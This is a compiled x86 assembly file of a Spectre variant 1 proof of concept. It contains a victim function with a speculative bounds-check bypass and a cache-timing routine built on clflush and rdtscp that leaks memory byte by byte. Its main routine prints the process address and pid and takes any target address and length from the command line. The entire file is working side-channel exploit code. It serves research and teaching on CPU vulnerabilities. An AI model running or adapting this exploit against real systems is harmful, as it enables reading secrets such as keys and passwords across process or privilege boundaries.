	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	xor	eax, eax
	cmp	DWORD PTR 4[esp], 15
	setbe	al
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.p2align 4
	.type	victim_function.constprop.0, @function
victim_function.constprop.0:
.LFB5566:
	.cfi_startproc
	call	__x86.get_pc_thunk.dx
	add	edx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	ecx, DWORD PTR x_is_safe_static@GOTOFF[edx]
	test	ecx, ecx
	je	.L3
	movzx	eax, BYTE PTR array1@GOTOFF[edx+eax]
	sal	eax, 9
	movzx	eax, BYTE PTR array2@GOTOFF[edx+eax]
	and	BYTE PTR temp@GOTOFF[edx], al
.L3:
	ret
	.cfi_endproc
.LFE5566:
	.size	victim_function.constprop.0, .-victim_function.constprop.0
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5563:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	edx, DWORD PTR 8[esp]
	mov	edx, DWORD PTR [edx]
	test	edx, edx
	je	.L5
	mov	edx, DWORD PTR 4[esp]
	movzx	edx, BYTE PTR array1@GOTOFF[eax+edx]
	sal	edx, 9
	movzx	edx, BYTE PTR array2@GOTOFF[eax+edx]
	and	BYTE PTR temp@GOTOFF[eax], dl
.L5:
	ret
	.cfi_endproc
.LFE5563:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5564:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ecx, 256
	push	edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	push	esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	call	__x86.get_pc_thunk.si
	add	esi, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	push	ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	sub	esp, 92
	.cfi_def_cfa_offset 112
	mov	eax, DWORD PTR 116[esp]
	mov	DWORD PTR 56[esp], eax
	mov	eax, DWORD PTR 120[esp]
	lea	edi, results.0@GOTOFF[esi]
	mov	DWORD PTR 16[esp], esi
	mov	DWORD PTR 60[esp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR 76[esp], eax
	xor	eax, eax
	mov	DWORD PTR 36[esp], edi
	mov	DWORD PTR 68[esp], 0
	mov	DWORD PTR 44[esp], 999
	rep stosd
	lea	eax, x_is_safe_static@GOTOFF[esi]
	mov	DWORD PTR 48[esp], eax
	lea	eax, 68[esp]
	mov	DWORD PTR 24[esp], eax
	lea	eax, array2@GOTOFF[esi]
	mov	DWORD PTR 20[esp], eax
	lea	eax, results.0@GOTOFF
	mov	DWORD PTR 52[esp], eax
	lea	eax, array1@GOTOFF[esi]
	mov	DWORD PTR 32[esp], eax
.L8:
	mov	esi, DWORD PTR 20[esp]
	mov	eax, esi
	lea	edx, 131072[esi]
	.p2align 4,,10
	.p2align 3
.L9:
	clflush	[eax]
	add	eax, 512
	cmp	eax, edx
	jne	.L9
	mov	eax, DWORD PTR 44[esp]
	mov	ebx, DWORD PTR 112[esp]
	mov	edi, 29
	mov	esi, -1431655765
	mov	ebp, DWORD PTR 48[esp]
	and	eax, 15
	mov	DWORD PTR 28[esp], eax
	xor	ebx, eax
	.p2align 4,,10
	.p2align 3
.L12:
	mov	eax, edi
	mul	esi
	mov	eax, edi
	shr	edx, 2
	lea	edx, [edx+edx*2]
	add	edx, edx
	sub	eax, edx
	sub	eax, 1
	mov	edx, eax
	shr	eax, 16
	xor	dx, dx
	or	edx, eax
	and	edx, ebx
	xor	edx, DWORD PTR 28[esp]
	cmp	edx, 15
	ja	.L10
	mov	eax, DWORD PTR 16[esp]
	mov	DWORD PTR x_is_safe_static@GOTOFF[eax], 1
.L10:
	clflush	0[ebp]
	mov	DWORD PTR 72[esp], 0
	mov	eax, DWORD PTR 72[esp]
	cmp	eax, 99
	jg	.L14
	.p2align 4,,10
	.p2align 3
.L11:
	mov	eax, DWORD PTR 72[esp]
	add	eax, 1
	mov	DWORD PTR 72[esp], eax
	mov	eax, DWORD PTR 72[esp]
	cmp	eax, 99
	jle	.L11
.L14:
	mov	eax, edx
	call	victim_function.constprop.0
	mov	eax, DWORD PTR 16[esp]
	mov	DWORD PTR x_is_safe_static@GOTOFF[eax], 0
	sub	edi, 1
	jnb	.L12
	mov	DWORD PTR 40[esp], edi
	mov	ebp, 13
	.p2align 4,,10
	.p2align 3
.L13:
	mov	eax, ebp
	movzx	ebx, al
	mov	eax, ebx
	sal	eax, 9
	mov	DWORD PTR 4[esp], eax
	rdtscp
	mov	esi, DWORD PTR 24[esp]
	mov	DWORD PTR 8[esp], eax
	mov	DWORD PTR 12[esp], edx
	mov	DWORD PTR [esi], ecx
	mov	edi, DWORD PTR 20[esp]
	mov	eax, DWORD PTR 4[esp]
	movzx	eax, BYTE PTR [edi+eax]
	rdtscp
	mov	DWORD PTR [esi], ecx
	sub	eax, DWORD PTR 8[esp]
	mov	ecx, 100
	mov	esi, eax
	sbb	edx, DWORD PTR 12[esp]
	xor	eax, eax
	cmp	ecx, esi
	sbb	eax, edx
	jc	.L15
	mov	eax, DWORD PTR 32[esp]
	mov	esi, DWORD PTR 28[esp]
	movzx	eax, BYTE PTR [eax+esi]
	cmp	eax, ebx
	je	.L15
	mov	eax, DWORD PTR 36[esp]
	add	DWORD PTR [eax+ebx*4], 1
.L15:
	add	ebp, 167
	cmp	ebp, 42765
	jne	.L13
	mov	eax, DWORD PTR 52[esp]
	mov	esi, DWORD PTR 16[esp]
	xor	ecx, ecx
	mov	edi, DWORD PTR 40[esp]
	mov	ebp, DWORD PTR 36[esp]
	mov	esi, DWORD PTR [eax+esi]
	mov	eax, 1
	mov	edx, esi
	jmp	.L17
	.p2align 4,,10
	.p2align 3
.L40:
	cmp	edi, -1
	je	.L22
	cmp	ebx, DWORD PTR 0[ebp+edi*4]
	cmovge	edi, eax
.L16:
	add	eax, 1
	mov	edx, DWORD PTR 0[ebp+ecx*4]
	cmp	eax, 256
	je	.L39
.L17:
	mov	ebx, DWORD PTR 16[esp]
	mov	ebx, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	cmp	ebx, edx
	jl	.L40
	mov	edi, ecx
	mov	ecx, eax
	add	eax, 1
	mov	edx, DWORD PTR 0[ebp+ecx*4]
	cmp	eax, 256
	jne	.L17
.L39:
	mov	eax, DWORD PTR 36[esp]
	mov	DWORD PTR 40[esp], edi
	mov	eax, DWORD PTR [eax+edi*4]
	lea	ebx, 4[eax+eax]
	cmp	ebx, edx
	jl	.L18
	cmp	edx, 2
	jne	.L24
	test	eax, eax
	je	.L18
.L24:
	sub	DWORD PTR 44[esp], 1
	jne	.L8
.L18:
	mov	eax, DWORD PTR 16[esp]
	xor	esi, DWORD PTR 68[esp]
	mov	edi, DWORD PTR 36[esp]
	mov	ebx, DWORD PTR 60[esp]
	mov	DWORD PTR results.0@GOTOFF[eax], esi
	mov	esi, DWORD PTR 56[esp]
	mov	BYTE PTR [esi], cl
	mov	eax, DWORD PTR [edi+ecx*4]
	mov	ecx, DWORD PTR 40[esp]
	mov	DWORD PTR [ebx], eax
	mov	BYTE PTR 1[esi], cl
	mov	eax, DWORD PTR [edi+ecx*4]
	mov	DWORD PTR 4[ebx], eax
	mov	eax, DWORD PTR 76[esp]
	sub	eax, DWORD PTR gs:20
	jne	.L41
	add	esp, 92
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	pop	ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	pop	esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	pop	edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
	.p2align 4,,10
	.p2align 3
.L22:
	.cfi_restore_state
	mov	edi, eax
	jmp	.L16
.L41:
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5564:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.4
	.align 4
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5565:
	.cfi_startproc
	lea	ecx, 4[esp]
	.cfi_def_cfa 1, 0
	and	esp, -16
	push	DWORD PTR -4[ecx]
	push	ebp
	mov	ebp, esp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	push	edi
	push	esi
	push	ebx
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	call	__x86.get_pc_thunk.bx
	add	ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	push	ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	sub	esp, 104
	mov	eax, DWORD PTR [ecx]
	mov	DWORD PTR -104[ebp], eax
	mov	eax, DWORD PTR 4[ecx]
	mov	DWORD PTR -116[ebp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR -28[ebp], eax
	mov	eax, DWORD PTR stdin@GOT[ebx]
	mov	DWORD PTR -68[ebp], eax
	lea	eax, check@GOTOFF[ebx]
	mov	DWORD PTR -112[ebp], eax
	sar	eax, 31
	mov	DWORD PTR -108[ebp], eax
	.p2align 4,,10
	.p2align 3
.L43:
	mov	eax, DWORD PTR -68[ebp]
	sub	esp, 12
	push	DWORD PTR [eax]
	call	getc@PLT
	add	esp, 16
	cmp	al, 114
	je	.L61
	cmp	al, 10
	je	.L43
	cmp	al, 105
	jne	.L53
	call	getpid@PLT
	sub	esp, 12
	mov	edx, DWORD PTR -108[ebp]
	push	eax
	mov	eax, DWORD PTR -112[ebp]
	add	eax, 33
	adc	edx, 0
	push	edx
	push	eax
	lea	eax, .LC12@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	jmp	.L43
.L61:
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	lea	edi, array1@GOTOFF[ebx]
	push	eax
	push	eax
	lea	eax, .LC2@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	mov	edx, eax
	mov	DWORD PTR [esp], eax
	sub	edx, edi
	mov	DWORD PTR -48[ebp], edx
	call	strlen@PLT
	add	esp, 12
	mov	DWORD PTR -44[ebp], eax
	mov	esi, eax
	lea	eax, array2@GOTOFF[ebx]
	push	131072
	push	1
	push	eax
	call	memset@PLT
	add	esp, 16
	cmp	DWORD PTR -104[ebp], 3
	je	.L62
.L45:
	sub	esp, 4
	lea	eax, .LC6@GOTOFF[ebx]
	push	esi
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	add	esp, 16
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	test	eax, eax
	js	.L43
	lea	eax, .LC7@GOTOFF[ebx]
	mov	DWORD PTR -60[ebp], 0
	mov	DWORD PTR -80[ebp], eax
	lea	eax, -40[ebp]
	mov	DWORD PTR -72[ebp], eax
	lea	eax, -30[ebp]
	mov	DWORD PTR -76[ebp], eax
	lea	eax, .LC8@GOTOFF[ebx]
	mov	DWORD PTR -84[ebp], eax
	lea	eax, .LC9@GOTOFF[ebx]
	mov	DWORD PTR -92[ebp], eax
	lea	eax, .LC11@GOTOFF[ebx]
	mov	DWORD PTR -88[ebp], eax
	lea	eax, .LC1@GOTOFF[ebx]
	mov	DWORD PTR -100[ebp], eax
	lea	eax, .LC0@GOTOFF[ebx]
	mov	DWORD PTR -96[ebp], eax
	.p2align 4,,10
	.p2align 3
.L46:
	mov	edi, DWORD PTR -60[ebp]
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	mov	esi, 63
	movsx	eax, BYTE PTR [eax+edi]
	add	edi, 1
	push	eax
	push	DWORD PTR -48[ebp]
	push	DWORD PTR -80[ebp]
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -48[ebp]
	add	esp, 12
	push	DWORD PTR -72[ebp]
	push	DWORD PTR -76[ebp]
	push	eax
	lea	edx, 1[eax]
	mov	DWORD PTR -60[ebp], edi
	mov	DWORD PTR -48[ebp], edx
	call	readMemoryByte
	mov	edi, DWORD PTR -36[ebp]
	mov	edx, DWORD PTR -40[ebp]
	add	esp, 12
	lea	eax, [edi+edi]
	mov	DWORD PTR -64[ebp], edx
	cmp	edx, eax
	mov	eax, DWORD PTR -100[ebp]
	cmovge	eax, DWORD PTR -96[ebp]
	push	eax
	push	DWORD PTR -84[ebp]
	push	1
	call	__printf_chk@PLT
	movzx	ecx, BYTE PTR -30[ebp]
	mov	edx, DWORD PTR -64[ebp]
	mov	eax, ecx
	mov	DWORD PTR [esp], edx
	sub	eax, 32
	cmp	al, 95
	mov	eax, esi
	cmovb	eax, ecx
	push	eax
	push	ecx
	push	DWORD PTR -92[ebp]
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	test	edi, edi
	jle	.L50
	movzx	edx, BYTE PTR -29[ebp]
	mov	eax, edx
	sub	eax, 32
	cmp	al, 95
	lea	eax, .LC10@GOTOFF[ebx]
	cmovb	esi, edx
	sub	esp, 12
	push	edi
	push	esi
	push	edx
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
.L50:
	sub	esp, 8
	push	DWORD PTR -88[ebp]
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	add	esp, 16
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	test	eax, eax
	jns	.L46
	jmp	.L43
.L53:
	mov	eax, DWORD PTR -28[ebp]
	sub	eax, DWORD PTR gs:20
	jne	.L63
	lea	esp, -16[ebp]
	xor	eax, eax
	pop	ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	pop	ebx
	.cfi_restore 3
	pop	esi
	.cfi_restore 6
	pop	edi
	.cfi_restore 7
	pop	ebp
	.cfi_restore 5
	lea	esp, -4[ecx]
	.cfi_def_cfa 4, 4
	ret
.L62:
	.cfi_restore_state
	mov	esi, DWORD PTR -116[ebp]
	push	eax
	lea	eax, -48[ebp]
	push	eax
	lea	eax, .LC3@GOTOFF[ebx]
	push	eax
	push	DWORD PTR 4[esi]
	call	__isoc99_sscanf@PLT
	add	esp, 12
	lea	eax, -44[ebp]
	sub	DWORD PTR -48[ebp], edi
	push	eax
	lea	eax, .LC4@GOTOFF[ebx]
	push	eax
	push	DWORD PTR 8[esi]
	call	__isoc99_sscanf@PLT
	lea	eax, .LC5@GOTOFF[ebx]
	push	DWORD PTR -44[ebp]
	push	DWORD PTR -48[ebp]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	esi, DWORD PTR -44[ebp]
	add	esp, 32
	jmp	.L45
.L63:
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC13
	.globl	unused3
	.bss
	.align 32
	.type	unused3, @object
	.size	unused3, 64
unused3:
	.zero	64
	.globl	array2
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	x_is_safe_static
	.align 4
	.type	x_is_safe_static, @object
	.size	x_is_safe_static, 4
x_is_safe_static:
	.zero	4
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5567:
	.cfi_startproc
	mov	eax, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5567:
	.section	.text.__x86.get_pc_thunk.dx,"axG",@progbits,__x86.get_pc_thunk.dx,comdat
	.globl	__x86.get_pc_thunk.dx
	.hidden	__x86.get_pc_thunk.dx
	.type	__x86.get_pc_thunk.dx, @function
__x86.get_pc_thunk.dx:
.LFB5568:
	.cfi_startproc
	mov	edx, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5568:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB5569:
	.cfi_startproc
	mov	ebx, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5569:
	.section	.text.__x86.get_pc_thunk.si,"axG",@progbits,__x86.get_pc_thunk.si,comdat
	.globl	__x86.get_pc_thunk.si
	.hidden	__x86.get_pc_thunk.si
	.type	__x86.get_pc_thunk.si, @function
__x86.get_pc_thunk.si:
.LFB5570:
	.cfi_startproc
	mov	esi, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5570:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
